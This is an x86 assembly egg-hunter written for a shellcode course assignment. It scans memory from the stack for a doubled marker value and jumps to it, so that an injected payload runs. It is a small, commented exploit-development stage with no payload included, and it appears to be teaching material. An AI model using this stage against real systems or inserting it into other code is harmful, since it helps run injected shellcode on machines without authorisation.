; SLAE Assigment 3 - Egg-hunter
; Author: rtmcx (rtmcx@protonmail.com)
;
; EGG = 90509050


global _start

section .text
_start:
	;mov eax, addr			; The address to start the memory search from
							; In this case, the address of a variable in this segment 
	mov eax, esp			; The address to start the memory search from
	mov ebx,  0x50905090	; This is the egg 

hunting:
	inc eax					; Go to next byte in memory
	cmp dword [eax], ebx	; Compare the value in the memory address to the egg
	jne hunting				; No egg, loop

	; second search, since the egg must be two times in row
	cmp dword [eax +4], ebx ; Compare the value in the memory address to the egg 
	jne hunting		; No egg, loop
	
	; EGG found, execute payload located after egg
	jmp eax

	;addr: db 0x1
